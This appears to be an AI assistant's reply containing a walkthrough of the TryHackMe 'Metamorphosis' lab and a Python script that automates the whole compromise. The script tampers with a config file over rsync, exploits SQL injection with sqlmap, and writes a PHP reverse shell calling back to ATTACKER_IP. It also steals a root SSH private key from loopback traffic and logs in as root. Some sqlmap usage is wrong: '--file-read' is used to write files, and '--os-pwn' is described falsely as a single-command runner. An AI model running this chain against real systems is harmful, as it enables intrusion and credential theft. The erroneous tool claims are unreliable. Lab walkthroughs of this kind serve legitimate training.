Now I have all the details from multiple writeups. Let me give you the full writeup and automation script.

## Full Writeup — TryHackMe Metamorphosis

### 1. Recon

Nmap reveals open ports: **22** (SSH), **80** (HTTP), **139/445** (SMB), **873** (rsync).

### 2. Rsync (Port 873)

- Connect: `rsync rsync://rsync-connect@metamorphosis.thm/`
- Module `Conf` is accessible. Download `webapp.ini`:
  ```
  rsync rsync://rsync-connect@metamorphosis.thm/Conf/webapp.ini ./
  ```
- The file contains `env = prod`. Change it to `env = dev` and re-upload:
  ```
  rsync -v ./webapp.ini rsync://rsync-connect@metamorphosis.thm/Conf/webapp.ini
  ```
- This enables the admin panel at `/admin/index.php`.

### 3. SQL Injection → User Shell

- The admin login at `/admin/index.php` is vulnerable to SQLi.
- Use sqlmap for OS shell:
  ```
  sqlmap -u "http://metamorphosis.thm/admin/index.php" --level 5 --risk 3 --batch --os-shell --forms
  ```
- Alternatively, upload a PHP reverse shell via sqlmap's `--file-write` and trigger it.
- Read user flag: `cat /home/tom/user.txt`

### 4. Privilege Escalation → Root

- Upload **pspy64** to the target and run it.
- Observe a root cron job executing:
  ```
  curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12
  ```
- Run tcpdump on the loopback interface to capture the response (which contains an SSH private key):
  ```
  tcpdump -i lo port 1027 -c 10 -A -vvv
  ```
- Extract the SSH key from the captured traffic.
- Save locally, `chmod 600`, then:
  ```
  ssh -i key root@metamorphosis.thm
  ```
- Read root flag: `cat /root/root.txt`

---

## Python Automation Script

```python
#!/usr/bin/env python3
"""
Metamorphosis THM Room - Full Automation Script
Target: metamorphosis.thm (must be in /etc/hosts)
Requirements: sqlmap, paramiko (pip install paramiko), pspy64 binary locally
"""

import subprocess
import socket
import time
import threading
import os
import re
import requests
import paramiko

TARGET = "metamorphosis.thm"
ATTACKER_IP = "YOUR_ATTACKER_IP"  # <-- CHANGE THIS
LISTENER_PORT = 4444
WORKDIR = "/tmp/metamorphosis"

os.makedirs(WORKDIR, exist_ok=True)


def run(cmd, shell=True, timeout=300):
    """Run a local command and return stdout."""
    print(f"[*] Running: {cmd}")
    result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=timeout)
    if result.stdout:
        print(result.stdout[:2000])
    if result.returncode != 0 and result.stderr:
        print(f"[!] stderr: {result.stderr[:500]}")
    return result


def step1_recon():
    """Port scan for confirmation."""
    print("\n" + "="*60)
    print("STEP 1: RECON")
    print("="*60)
    run(f"nmap -sC -sV -p 22,80,139,445,873 {TARGET}", timeout=120)


def step2_rsync():
    """Download webapp.ini, change env to dev, re-upload."""
    print("\n" + "="*60)
    print("STEP 2: RSYNC - Modify webapp.ini")
    print("="*60)

    ini_path = os.path.join(WORKDIR, "webapp.ini")

    # Download
    run(f"rsync rsync://rsync-connect@{TARGET}/Conf/webapp.ini {ini_path}")

    # Read and modify
    with open(ini_path, "r") as f:
        content = f.read()
    print(f"[*] Original content:\n{content}")

    content = content.replace("env = prod", "env = dev")
    if "env = dev" not in content:
        # Try other patterns
        content = re.sub(r"env\s*=\s*\w+", "env = dev", content)

    with open(ini_path, "w") as f:
        f.write(content)
    print(f"[*] Modified content:\n{content}")

    # Re-upload
    run(f"rsync -v {ini_path} rsync://rsync-connect@{TARGET}/Conf/webapp.ini")
    print("[+] webapp.ini uploaded with env=dev")


def step3_sqlmap_webshell():
    """Use sqlmap to write a PHP reverse shell to the web root."""
    print("\n" + "="*60)
    print("STEP 3: SQLMAP - Write PHP Reverse Shell")
    print("="*60)

    # Create PHP reverse shell
    shell_code = f"""<?php
$sock = fsockopen("{ATTACKER_IP}", {LISTENER_PORT});
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>"""

    shell_path = os.path.join(WORKDIR, "rev.php")
    with open(shell_path, "w") as f:
        f.write(shell_code)

    # Use sqlmap to write the file to the target web root
    run(
        f'sqlmap -u "http://{TARGET}/admin/index.php" '
        f'--level 5 --risk 3 --batch --forms '
        f'--file-read={shell_path} '
        f'--file-dest=/var/www/html/rev.php',
        timeout=600
    )
    print("[+] PHP reverse shell written to /var/www/html/rev.php")


def step4_get_shell():
    """Start listener and trigger the reverse shell."""
    print("\n" + "="*60)
    print("STEP 4: REVERSE SHELL")
    print("="*60)

    shell_ready = threading.Event()
    shell_lines = []

    def listener():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", LISTENER_PORT))
        s.listen(1)
        print(f"[*] Listening on {LISTENER_PORT}...")
        conn, addr = s.accept()
        print(f"[+] Connection from {addr}")
        shell_ready.set()
        buf = b""
        while True:
            data = conn.recv(4096)
            if not data:
                break
            buf += data
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                text = line.decode(errors="ignore")
                shell_lines.append(text)
                print(f"[SHELL] {text}")
        conn.close()
        s.close()

    t = threading.Thread(target=listener, daemon=True)
    t.start()
    time.sleep(2)

    # Trigger the shell
    print("[*] Triggering reverse shell...")
    requests.get(f"http://{TARGET}/rev.php", timeout=10)

    shell_ready.wait(timeout=30)
    time.sleep(2)

    return shell_lines


def step5_user_flag():
    """Read user flag via the shell (using sqlmap --os-pwn for reliability)."""
    print("\n" + "="*60)
    print("STEP 5: USER FLAG")
    print("="*60)

    # Use sqlmap os-pwn to read the flag
    result = run(
        f'sqlmap -u "http://{TARGET}/admin/index.php" '
        f'--level 5 --risk 3 --batch --forms '
        f'--os-pwn="cat /home/tom/user.txt"',
        timeout=300
    )
    # Extract the flag
    flag_match = re.search(r"THM\{[^}]+\}", result.stdout)
    if flag_match:
        print(f"\n[+] USER FLAG: {flag_match.group()}")
        return flag_match.group()
    else:
        print(f"[!] Could not parse flag. Raw output:\n{result.stdout[-500:]}")
        return None


def step6_upload_pspy():
    """Upload pspy64 to the target."""
    print("\n" + "="*60)
    print("STEP 6: Upload pspy64")
    print("="*60)

    # Find pspy64 locally (adjust path as needed)
    pspy_local = None
    for p in ["/usr/share/pspy/pspy64", os.path.expanduser("~/pspy64"),
              os.path.join(WORKDIR, "pspy64"), "/opt/pspy/pspy64"]:
        if os.path.exists(p):
            pspy_local = p
            break

    if not pspy_local:
        print("[!] pspy64 not found locally. Downloading...")
        run(f"wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -O {WORKDIR}/pspy64")
        run(f"chmod +x {WORKDIR}/pspy64")
        pspy_local = os.path.join(WORKDIR, "pspy64")

    # Upload via sqlmap file-write
    run(
        f'sqlmap -u "http://{TARGET}/admin/index.php" '
        f'--level 5 --risk 3 --batch --forms '
        f'--file-read={pspy_local} '
        f'--file-dest=/tmp/pspy64',
        timeout=600
    )
    # Make it executable
    run(
        f'sqlmap -u "http://{TARGET}/admin/index.php" '
        f'--level 5 --risk 3 --batch --forms '
        f'--os-pwn="chmod +x /tmp/pspy64"',
        timeout=300
    )
    print("[+] pspy64 uploaded and made executable")


def step7_catch_ssh_key():
    """Run tcpdump on lo:1027 and trigger the cron job to capture the SSH key."""
    print("\n" + "="*60)
    print("STEP 7: Capture SSH Key via tcpdump")
    print("="*60)

    # Run tcpdump on the target (capture 10 packets on lo port 1027)
    # This will block until packets are captured, so run in background via the shell
    # and trigger pspy simultaneously

    # First, start tcpdump in background on target, output to a file
    run(
        f'sqlmap -u "http://{TARGET}/admin/index.php" '
        f'--level 5 --risk 3 --batch --forms '
        f'--os-pwn="tcpdump -i lo port 1027 -c 5 -A -vvv > /tmp/capture.txt 2>&1 &"',
        timeout=300
    )
    time.sleep(2)

    # Trigger pspy to observe/wait for the cron job (or just wait for it)
    # The cron job runs periodically, so we just need to wait
    print("[*] Waiting for cron job to trigger (up to 60s)...")
    time.sleep(30)

    # Read the capture
    result = run(
        f'sqlmap -u "http://{TARGET}/admin/index.php" '
        f'--level 5 --risk 3 --batch --forms '
        f'--os-pwn="cat /tmp/capture.txt"',
        timeout=300
    )

    capture = result.stdout

    # Extract SSH private key from the capture
    key_match = re.search(
        r"(-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----.*?-----END (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----)",
        capture, re.DOTALL
    )

    if key_match:
        ssh_key = key_match.group(1)
        key_path = os.path.join(WORKDIR, "root_key")
        with open(key_path, "w") as f:
            f.write(ssh_key + "\n")
        os.chmod(key_path, 0o600)
        print(f"[+] SSH key saved to {key_path}")
        return key_path
    else:
        print("[!] Could not find SSH key in capture. Raw output:")
        print(capture[-2000:])
        # Alternative: try curl with the admin parameter directly
        print("[*] Trying direct curl with admin parameter...")
        result2 = run(
            f'sqlmap -u "http://{TARGET}/admin/index.php" '
            f'--level 5 --risk 3 --batch --forms '
            f'--os-pwn="curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12"',
            timeout=300
        )
        key_match2 = re.search(
            r"(-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----.*?-----END (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----)",
            result2.stdout, re.DOTALL
        )
        if key_match2:
            ssh_key = key_match2.group(1)
            key_path = os.path.join(WORKDIR, "root_key")
            with open(key_path, "w") as f:
                f.write(ssh_key + "\n")
            os.chmod(key_path, 0o600)
            print(f"[+] SSH key saved to {key_path}")
            return key_path
        print("[!] Failed to extract SSH key.")
        return None


def step8_root_access(key_path):
    """SSH as root and read the root flag."""
    print("\n" + "="*60)
    print("STEP 8: ROOT ACCESS")
    print("="*60)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            TARGET,
            username="root",
            key_filename=key_path,
            timeout=30
        )
        print("[+] Connected as root!")

        stdin, stdout, stderr = client.exec_command("cat /root/root.txt")
        flag = stdout.read().decode().strip()
        print(f"[+] ROOT FLAG: {flag}")
        client.close()
        return flag
    except Exception as e:
        print(f"[!] SSH error: {e}")
        return None


def main():
    print("="*60)
    print("  METAMORPHOSIS - FULL AUTOMATION")
    print(f"  Target: {TARGET}")
    print(f"  Attacker IP: {ATTACKER_IP}")
    print("="*60)

    if ATTACKER_IP == "YOUR_ATTACKER_IP":
        print("\n[!] ERROR: Set ATTACKER_IP at the top of the script!")
        return

    step1_recon()
    step2_rsync()
    step3_sqlmap_webshell()
    step4_get_shell()
    user_flag = step5_user_flag()
    step6_upload_pspy()
    key_path = step7_catch_ssh_key()
    root_flag = None
    if key_path:
        root_flag = step8_root_access(key_path)

    print("\n" + "="*60)
    print("  RESULTS")
    print("="*60)
    print(f"  user.txt : {user_flag or 'FAILED'}")
    print(f"  root.txt : {root_flag or 'FAILED'}")
    print("="*60)


if __name__ == "__main__":
    main()
```

### How to Use

1. **Set your attacker IP** at the top of the script (`ATTACKER_IP`).
2. **Install dependencies**:
   ```
   pip install paramiko requests
   ```
3. **Ensure sqlmap** is installed and in your PATH.
4. **Have pspy64** available locally (the script will auto-download it if not found).
5. **Run**:
   ```
   python3 metamorphosis_auto.py
   ```

### Important Notes

- The `--os-pwn` flag in sqlmap executes a single command and returns output — it's the most reliable way to automate without an interactive shell.
- The cron job on port 1027 runs periodically. If the first tcpdump capture misses it, the script falls back to directly curling the endpoint with the `?admin=` parameter.
- If sqlmap's `--file-write` fails (some PHP configs restrict it), you may need to manually upload the webshell via the sqlmap interactive shell.
- The script assumes the web root is `/var/www/html/`. Adjust if needed.

